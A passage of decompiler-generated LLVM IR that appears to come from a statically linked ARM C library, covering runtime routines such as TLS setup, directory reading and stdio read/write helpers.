  br label %dec_label_pc_18c84

dec_label_pc_18c84:                               ; preds = %dec_label_pc_18c84.loopexit, %entry, %bb55
  %v0_18b64.pre.pre = phi i32 [ ptrtoint (i32* @global_var_233cc.493 to i32), %dec_label_pc_18c84.loopexit ], [ ptrtoint (i32* @global_var_233cc.493 to i32), %entry ], [ %v0_18b64.pre.pre.pre, %bb55 ]
  %v1_18b54.pre.pre = phi i32 [ %v0_18ab8, %dec_label_pc_18c84.loopexit ], [ %v0_18ab8, %entry ], [ %v1_18b54.pre.pre.pre, %bb55 ]
  %v0_18c8c = phi i32 [ %v0_18abc, %dec_label_pc_18c84.loopexit ], [ %v0_18abc, %entry ], [ %v0_18c8c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_18c8c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18b50

; uselistorder directives
  uselistorder i32 %v0_18c8c, { 1, 0 }
  uselistorder i32 %v1_18c40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18bac, { 1, 0 }
  uselistorder i32 %v2_18ba8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_18b0c, { 2, 1, 0 }
  uselistorder i32 %v3_18ae4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_18aec66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_18b10, { 1, 0 }
  uselistorder i32 %v0_18abc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_18ab8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18aac, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 12, 4, 6, 5, 7, 8, 9, 10, 11, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10752, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 7, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 10240, { 3, 4, 8, 5, 9, 2, 10, 1, 11, 6, 12, 7, 13, 0, 14 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 3, 2, 1, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_18c84, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_18b54, { 1, 0 }
  uselistorder label %dec_label_pc_18b50, { 1, 0 }
  uselistorder label %dec_label_pc_18ad4, { 1, 0 }
}

define i32 @function_18ca4(i32 %arg1) local_unnamed_addr {
dec_label_pc_18ca4:
  %v0_18ca4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18ca4, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_18ca4
  %v1_18ca8 = load i32, i32* @ip, align 4
  %v1_18cb8 = load i32, i32* @r5, align 4
  %v2_18cbc = load i32, i32* @r4, align 4
  %v2_18cb8 = and i32 %v1_18ca8, 101568
  %v9_18cbc = and i32 %v2_18cb8, %v1_18cb8
  %v9_18cc0 = and i32 %v9_18cbc, %v2_18cbc
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_18ca4, %bb
  %v7_18cc4 = phi i32 [ %arg1, %dec_label_pc_18ca4 ], [ %v9_18cc0, %bb ]
  ret i32 %v7_18cc4

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18cd0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18cd0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v4_18ce0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 156) to i32*), align 4
  %v4_18ce8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 104) to i32*), align 4
  store i32 %v4_18ce8, i32* %r1.global-to-local, align 4
  %v1_18cec = add i32 %arg1, 44
  %v2_18cec = inttoptr i32 %v1_18cec to i32*
  %v3_18cec = load i32, i32* %v2_18cec, align 4
  %v1_18cf0 = add i32 %arg1, 28
  %v2_18cf0 = inttoptr i32 %v1_18cf0 to i32*
  %v3_18cf0 = load i32, i32* %v2_18cf0, align 4
  store i32 %v3_18cf0, i32* %r2.global-to-local, align 4
  %v2_18cf4 = inttoptr i32 %v4_18ce0 to i32*
  store i32 %v3_18cec, i32* %v2_18cf4, align 4
  %v0_18cf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18cf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_18cf8 = inttoptr i32 %v1_18cf8 to i32*
  store i32 %v0_18cf8, i32* %v2_18cf8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 6, 8, 3, 7, 4, 9, 5, 10 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18d04(i32 %arg1) local_unnamed_addr {
dec_label_pc_18d04:
  %v0_18d04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18d04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18d04
  %v1_18d04 = load i32, i32* @ip, align 4
  %v3_18d04 = mul i32 %v1_18d04, %arg1
  %v2_18d08 = load i32, i32* @r8, align 4
  %v4_18d08 = and i32 %v2_18d08, %v3_18d04
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18d04, %bb
  %v5_18d08 = phi i32 [ %arg1, %dec_label_pc_18d04 ], [ %v4_18d08, %bb ]
  ret i32 %v5_18d08

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18d14 = add i32 %arg1, 40
  store i32 %v1_18d14, i32* %r2.global-to-local, align 4
  %v1_18d18 = inttoptr i32 %v1_18d14 to i32*
  %v2_18d18 = load i32, i32* %v1_18d18, align 4
  store i32 %v2_18d18, i32* %r2.global-to-local, align 4
  %v3_18d18 = add i32 %arg1, 44
  %v4_18d18 = inttoptr i32 %v3_18d18 to i32*
  %v5_18d18 = load i32, i32* %v4_18d18, align 4
  store i32 %v5_18d18, i32* %r3.global-to-local, align 4
  %v0_18d1c = call i32 @__aeabi_read_tp()
  %v1_18d20 = inttoptr i32 %v0_18d1c to i32*
  %v2_18d20 = load i32, i32* %v1_18d20, align 4
  store i32 %v2_18d20, i32* %r1.global-to-local, align 4
  %v3_18d24 = mul i32 %v5_18d18, 8
  store i32 %v3_18d24, i32* %r3.global-to-local, align 4
  %v1_18d28 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d28 = add i32 %v1_18d28, %v0_18d1c
  %v3_18d2c = add i32 %v3_18d24, %v2_18d20
  %v4_18d2c = inttoptr i32 %v3_18d2c to i32*
  store i32 %v2_18d28, i32* %v4_18d2c, align 4
  %v0_18d30 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d30 = load i32, i32* %r1.global-to-local, align 4
  %v2_18d30 = add i32 %v1_18d30, %v0_18d30
  store i32 %v2_18d30, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_18d38 = add i32 %v2_18d30, 4
  %v5_18d38 = inttoptr i32 %v4_18d38 to i8*
  store i8 1, i8* %v5_18d38, align 1
  %v0_18d3c = load i32, i32* @r4, align 4
  %v1_18d3c = add i32 %v0_18d3c, 20
  store i32 %v1_18d3c, i32* %r1.global-to-local, align 4
  %v1_18d40 = inttoptr i32 %v1_18d3c to i32*
  %v2_18d40 = load i32, i32* %v1_18d40, align 4
  store i32 %v2_18d40, i32* @r1, align 4
  %v3_18d40 = add i32 %v0_18d3c, 24
  %v4_18d40 = inttoptr i32 %v3_18d40 to i32*
  %v5_18d40 = load i32, i32* %v4_18d40, align 4
  store i32 %v5_18d40, i32* %r2.global-to-local, align 4
  %v5_18d44 = call i32 @__GI_mempcpy(i32 %v2_18d28, i32 %v2_18d40, i32 %v5_18d40, i32 1)
  %v0_18d48 = load i32, i32* @r4, align 4
  %v1_18d48 = add i32 %v0_18d48, 28
  store i32 %v1_18d48, i32* %r3.global-to-local, align 4
  %v1_18d4c = inttoptr i32 %v1_18d48 to i32*
  %v2_18d4c = load i32, i32* %v1_18d4c, align 4
  store i32 %v2_18d4c, i32* %r2.global-to-local, align 4
  %v3_18d4c = add i32 %v0_18d48, 24
  %v4_18d4c = inttoptr i32 %v3_18d4c to i32*
  %v5_18d4c = load i32, i32* %v4_18d4c, align 4
  store i32 %v5_18d4c, i32* %r3.global-to-local, align 4
  %v2_18d50 = sub i32 %v5_18d4c, %v2_18d4c
  store i32 %v2_18d50, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18d58 = inttoptr i32 %v5_18d44 to i8*
  %v4_18d58 = call i32 @__GI_memset(i8* %v3_18d58, i32 0, i32 %v2_18d50)
  ret i32 %v4_18d58

; uselistorder directives
  uselistorder i32 %v3_18d24, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 12, 11, 9, 6, 7, 8, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_18da8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 11580) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_18dbc = load i32, i32* @r0, align 4
  %v1_18dc0 = inttoptr i32 %v0_18dbc to i32*
  %v2_18dc0 = load i32, i32* @r4, align 4
  store i32 %v2_18dc0, i32* %v1_18dc0, align 4
  %v3_18dc0 = add i32 %v0_18dbc, 4
  %v4_18dc0 = inttoptr i32 %v3_18dc0 to i32*
  %v5_18dc0 = load i32, i32* @r5, align 4
  store i32 %v5_18dc0, i32* %v4_18dc0, align 4
  %v6_18dc0 = add i32 %v0_18dbc, 8
  %v7_18dc0 = inttoptr i32 %v6_18dc0 to i32*
  %v8_18dc0 = load i32, i32* @r6, align 4
  store i32 %v8_18dc0, i32* %v7_18dc0, align 4
  %v9_18dc0 = add i32 %v0_18dbc, 12
  %v10_18dc0 = inttoptr i32 %v9_18dc0 to i32*
  %v11_18dc0 = load i32, i32* @r7, align 4
  store i32 %v11_18dc0, i32* %v10_18dc0, align 4
  %v12_18dc0 = add i32 %v0_18dbc, 16
  %v13_18dc0 = inttoptr i32 %v12_18dc0 to i32*
  %v14_18dc0 = load i32, i32* @r8, align 4
  store i32 %v14_18dc0, i32* %v13_18dc0, align 4
  %v15_18dc0 = add i32 %v0_18dbc, 20
  %v16_18dc0 = inttoptr i32 %v15_18dc0 to i32*
  %v17_18dc0 = load i32, i32* @sb, align 4
  store i32 %v17_18dc0, i32* %v16_18dc0, align 4
  %v18_18dc0 = add i32 %v0_18dbc, 24
  %v19_18dc0 = inttoptr i32 %v18_18dc0 to i32*
  %v20_18dc0 = load i32, i32* @sl, align 4
  store i32 %v20_18dc0, i32* %v19_18dc0, align 4
  %v21_18dc0 = add i32 %v0_18dbc, 28
  %v22_18dc0 = inttoptr i32 %v21_18dc0 to i32*
  %v23_18dc0 = load i32, i32* @fp, align 4
  store i32 %v23_18dc0, i32* %v22_18dc0, align 4
  %v24_18dc0 = add i32 %v0_18dbc, 32
  %v25_18dc0 = inttoptr i32 %v24_18dc0 to i32*
  %v27_18dc0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_18dc0, i32* %v25_18dc0, align 4
  %v28_18dc0 = add i32 %v0_18dbc, 36
  %v29_18dc0 = inttoptr i32 %v28_18dc0 to i32*
  %v30_18dc0 = load i32, i32* @lr, align 4
  store i32 %v30_18dc0, i32* %v29_18dc0, align 4
  %v0_18dc4 = call i32 @__sigjmp_save()
  ret i32 %v0_18dc4

; uselistorder directives
  uselistorder i32 %v0_18dbc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 96, 97, 4, 5, 6, 7, 8, 9, 10, 11, 83, 84, 85, 86, 92, 94, 93, 95, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 32, 27, 28, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 54, 55, 1, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 87, 88, 89, 2, 90, 91, 98 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_18dcc = load i32, i32* @r5, align 4
  %v12_18dcc = load i32, i32* @r7, align 4
  %v1_18dd0 = add i32 %arg3, 14
  %v2_18dd8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_18ddc = and i32 %v1_18dd0, -8
  %v2_18de0 = sub i32 %v2_18dd8, %v1_18ddc
  %v1_18de4 = add i32 %v2_18de0, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18e28, label %dec_label_pc_18e0c

dec_label_pc_18e0c:                               ; preds = %entry
  %v1_18e10 = sub i32 0, %arg1
  %v3_18e14 = load i16, i16* @global_var_23424.488, align 2
  %v4_18e14 = sext i16 %v3_18e14 to i32
  %v0_18e18 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18e20 = add i32 %v4_18e14, %v0_18e18
  %v4_18e20 = inttoptr i32 %v3_18e20 to i32*
  store i32 %v1_18e10, i32* %v4_18e20, align 4
  br label %dec_label_pc_18ef8

dec_label_pc_18e28:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18ef8, label %dec_label_pc_18e30

dec_label_pc_18e30:                               ; preds = %dec_label_pc_18e28
  %v2_18e30 = add i32 %v1_18de4, %arg1
  store i32 %v2_18e30, i32* %r1.global-to-local, align 4
  %v2_18e34 = add i32 %tmp, %arg3
  store i32 %v1_18de4, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18ee0

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18ee0
  %v1_18e50 = add i32 %v0_18eb0, 16
  %v2_18e50 = inttoptr i32 %v1_18e50 to i16*
  %v3_18e50 = load i16, i16* %v2_18e50, align 2
  %v4_18e50 = zext i16 %v3_18e50 to i32
  %v1_18e54 = add nsw i32 %v4_18e50, -19
  store i32 %v1_18e54, i32* @r2, align 4
  %v1_18e58 = add nuw nsw i32 %v4_18e50, 7
  %v1_18e5c = and i32 %v1_18e58, 131064
  store i32 %v1_18e5c, i32* @ip, align 4
  %v2_18e64 = add i32 %v1_18e5c, %v0_18eb8
  store i32 %v2_18e64, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_18e64, %v2_18e34
  br i1 %tmp24, label %dec_label_pc_18e70, label %dec_label_pc_18eac

dec_label_pc_18e70:                               ; preds = %dec_label_pc_18e50
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18e78 = load i32, i32* %r8.global-to-local, align 4
  %v0_18e7c = load i32, i32* %sb.global-to-local, align 4
  %v1_18e80 = load i32, i32* @sp, align 4
  %v2_18e80 = inttoptr i32 %v1_18e80 to i32*
  store i32 0, i32* %v2_18e80, align 4
  %v4_18e84 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_18e78, i32 %v0_18e7c)
  %v0_18e88 = load i32, i32* @r5, align 4
  %v1_18e88 = load i32, i32* %sl.global-to-local, align 4
  %v9_18e88 = icmp eq i32 %v0_18e88, %v1_18e88
  br i1 %v9_18e88, label %dec_label_pc_18e90, label %dec_label_pc_18ef4

dec_label_pc_18e90:                               ; preds = %dec_label_pc_18e70
  %v0_18e94 = call i32 @__aeabi_read_tp()
  %v3_18e98 = load i16, i16* @global_var_23424.488, align 2
  %v4_18e98 = sext i16 %v3_18e98 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18ea4 = add i32 %v4_18e98, %v0_18e94
  %v4_18ea4 = inttoptr i32 %v3_18ea4 to i32*
  store i32 22, i32* %v4_18ea4, align 4
  br label %dec_label_pc_18ef8

dec_label_pc_18eac:                               ; preds = %dec_label_pc_18e50
  %v1_18eac = inttoptr i32 %v0_18eb0 to i32*
  %v2_18eac = load i32, i32* %v1_18eac, align 4
  %v3_18eac = add i32 %v0_18eb0, 4
  %v4_18eac = inttoptr i32 %v3_18eac to i32*
  %v5_18eac = load i32, i32* %v4_18eac, align 4
  store i32 %v5_18eac, i32* @r4, align 4
  %v1_18eb0 = add i32 %v0_18eb0, 8
  store i32 %v1_18eb0, i32* %r8.global-to-local, align 4
  %v1_18eb4 = inttoptr i32 %v1_18eb0 to i32*
  %v2_18eb4 = load i32, i32* %v1_18eb4, align 4
  store i32 %v2_18eb4, i32* %r8.global-to-local, align 4
  %v3_18eb4 = add i32 %v0_18eb0, 12
  %v4_18eb4 = inttoptr i32 %v3_18eb4 to i32*
  %v5_18eb4 = load i32, i32* %v4_18eb4, align 4
  store i32 %v5_18eb4, i32* %sb.global-to-local, align 4
  %v1_18eb8 = inttoptr i32 %v0_18eb8 to i32*
  store i32 %v2_18eac, i32* %v1_18eb8, align 4
  %v3_18eb8 = add i32 %v0_18eb8, 4
  %v4_18eb8 = inttoptr i32 %v3_18eb8 to i32*
  %v5_18eb8 = load i32, i32* @r4, align 4
  store i32 %v5_18eb8, i32* %v4_18eb8, align 4
  %v0_18ebc = load i32, i32* %r8.global-to-local, align 4
  %v1_18ebc = load i32, i32* @r5, align 4
  %v2_18ebc = add i32 %v1_18ebc, 8
  %v3_18ebc = inttoptr i32 %v2_18ebc to i32*
  store i32 %v0_18ebc, i32* %v3_18ebc, align 4
  %v0_18ec0 = load i32, i32* %sb.global-to-local, align 4
  %v1_18ec0 = load i32, i32* @r5, align 4
  %v2_18ec0 = add i32 %v1_18ec0, 12
  %v3_18ec0 = inttoptr i32 %v2_18ec0 to i32*
  store i32 %v0_18ec0, i32* %v3_18ec0, align 4
  %v0_18ec4 = load i32, i32* @ip, align 4
  %v1_18ec4 = trunc i32 %v0_18ec4 to i16
  %v2_18ec4 = load i32, i32* @r5, align 4
  %v3_18ec4 = add i32 %v2_18ec4, 16
  %v4_18ec4 = inttoptr i32 %v3_18ec4 to i16*
  store i16 %v1_18ec4, i16* %v4_18ec4, align 2
  %v0_18ec8 = load i32, i32* @r7, align 4
  %v1_18ec8 = add i32 %v0_18ec8, 18
  %v2_18ec8 = inttoptr i32 %v1_18ec8 to i8*
  %v3_18ec8 = load i8, i8* %v2_18ec8, align 1
  %v4_18ec8 = zext i8 %v3_18ec8 to i32
  store i32 %v4_18ec8, i32* @r3, align 4
  %v2_18ecc = load i32, i32* @r5, align 4
  %v3_18ecc = add i32 %v2_18ecc, 18
  %v4_18ecc = inttoptr i32 %v3_18ecc to i8*
  store i8 %v3_18ec8, i8* %v4_18ecc, align 1
  %v0_18ed0 = call i32 @memcpy()
  %v0_18ed4 = load i32, i32* @r7, align 4
  %v1_18ed4 = add i32 %v0_18ed4, 16
  %v2_18ed4 = inttoptr i32 %v1_18ed4 to i16*
  %v3_18ed4 = load i16, i16* %v2_18ed4, align 2
  %v4_18ed4 = zext i16 %v3_18ed4 to i32
  %v0_18ed8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18ed8, i32* @r5, align 4
  %v2_18edc = add i32 %v4_18ed4, %v0_18ed4
  store i32 %v2_18edc, i32* @r7, align 4
  br label %dec_label_pc_18ee0

dec_label_pc_18ee0:                               ; preds = %dec_label_pc_18e30, %dec_label_pc_18eac
  %v0_18eb8 = phi i32 [ %tmp, %dec_label_pc_18e30 ], [ %v0_18ed8, %dec_label_pc_18eac ]
  %v0_18eb0 = phi i32 [ %v1_18de4, %dec_label_pc_18e30 ], [ %v2_18edc, %dec_label_pc_18eac ]
  %v3_18ee4 = icmp ult i32 %v0_18eb0, %v2_18e30
  %v1_18ee8 = add i32 %v0_18eb8, 19
  store i32 %v1_18ee8, i32* @r0, align 4
  %v1_18eec = add i32 %v0_18eb0, 19
  store i32 %v1_18eec, i32* @r1, align 4
  br i1 %v3_18ee4, label %dec_label_pc_18e50, label %dec_label_pc_18ef4.loopexit

dec_label_pc_18ef4.loopexit:                      ; preds = %dec_label_pc_18ee0
  %v0_18ef4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18ef4

dec_label_pc_18ef4:                               ; preds = %dec_label_pc_18ef4.loopexit, %dec_label_pc_18e70
  %v1_18ef4 = phi i32 [ %v0_18eb8, %dec_label_pc_18ef4.loopexit ], [ %v0_18e88, %dec_label_pc_18e70 ]
  %v0_18ef4 = phi i32 [ %v0_18ef4.pre, %dec_label_pc_18ef4.loopexit ], [ %v1_18e88, %dec_label_pc_18e70 ]
  %v2_18ef4 = sub i32 %v1_18ef4, %v0_18ef4
  store i32 %v2_18ef4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ef8

dec_label_pc_18ef8:                               ; preds = %dec_label_pc_18e28, %dec_label_pc_18e90, %dec_label_pc_18e0c, %dec_label_pc_18ef4
  %v0_18ef8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_18dcc, i32* @r5, align 4
  store i32 %v12_18dcc, i32* @r7, align 4
  ret i32 %v0_18ef8

; uselistorder directives
  uselistorder i32 %v0_18eb0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18eb8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18de4, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 3, 4, 0, 1, 5, 6, 7, 2, 8 }
  uselistorder i32 18, { 6, 7, 2, 8, 5, 3, 9, 10, 4, 11, 0, 12, 1, 13 }
  uselistorder i32 22, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @sp, { 5, 4, 6, 1, 7, 0, 8, 2, 9, 3 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 4, 3, 2, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_18ef8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18ee0, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18f10 = load i32, i32* @r4, align 4
  store i32 %v3_18f10, i32* %stack_var_-12, align 4
  %v0_18f14 = load i32, i32* %r0.global-to-local, align 4
  %v1_18f14 = inttoptr i32 %v0_18f14 to i16*
  %v2_18f14 = load i16, i16* %v1_18f14, align 2
  %v3_18f14 = zext i16 %v2_18f14 to i32
  store i32 %v3_18f14, i32* @r3, align 4
  %v1_18f18 = and i32 %v3_18f14, 4
  store i32 %v1_18f18, i32* @r5, align 4
  %v2_18f18 = icmp eq i32 %v1_18f18, 0
  store i32 %v0_18f14, i32* @r4, align 4
  br i1 %v2_18f18, label %dec_label_pc_18f2c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18f2c:                               ; preds = %entry
  %v1_18f2c = icmp slt i32 %arg2, 0
  br i1 %v1_18f2c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18f2c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18f2c, %bb18
  %v1_18f34 = add i32 %v0_18f14, 4
  %v2_18f34 = inttoptr i32 %v1_18f34 to i32*
  %v3_18f34 = load i32, i32* %v2_18f34, align 4
  store i32 %v3_18f34, i32* %r0.global-to-local, align 4
  %v1_18f38 = call i32 @__libc_read(i32 %v3_18f34)
  store i32 %v1_18f38, i32* %r0.global-to-local, align 4
  %v5_18f40 = icmp sgt i32 %v1_18f38, 0
  br i1 %v5_18f40, label %.thread7, label %dec_label_pc_18f44

dec_label_pc_18f44:                               ; preds = %bb19
  %v2_18f3c = icmp eq i32 %v1_18f38, 0
  %v0_18f44 = load i32, i32* @r4, align 4
  %v1_18f44 = inttoptr i32 %v0_18f44 to i16*
  %v2_18f44 = load i16, i16* %v1_18f44, align 2
  br i1 %v2_18f3c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18f44
  %v2_18f48 = or i16 %v2_18f44, 4
  store i16 %v2_18f48, i16* %v1_18f44, align 2
  %v1_18f64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18f44
  %v2_18f4c = or i16 %v2_18f44, 8
  store i16 %v2_18f4c, i16* %v1_18f44, align 2
  %v1_18f58 = load i32, i32* @r5, align 4
  store i32 %v1_18f58, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18f64 = phi i32 [ %v1_18f64.pre, %bb20 ], [ 0, %bb ], [ %v1_18f38, %bb19 ], [ %v1_18f58, %bb21 ]
  %v2_18f60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18f60, i32* @r4, align 4
  ret i32 %v1_18f64

; uselistorder directives
  uselistorder i16 %v2_18f44, { 1, 0 }
  uselistorder i32 %v1_18f38, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1902c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1902c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1902c2, label %dec_label_pc_19034, label %dec_label_pc_18f84

dec_label_pc_18f84:                               ; preds = %entry, %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge
  %v0_18f90 = phi i32 [ %v0_18f90.pre, %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge ], [ %tmp, %entry ]
  %v0_18f8c = phi i32 [ %v5_18f9c, %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge ], [ %arg2, %entry ]
  %v3_18f84 = phi i32 [ %v3_18f84.pre, %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge ], [ 2147483647, %entry ]
  %v0_18f88.in = phi i32 [ %v5_18fa0, %dec_label_pc_1902cthread-pre-split.dec_label_pc_18f84_crit_edge ], [ %arg3, %entry ]
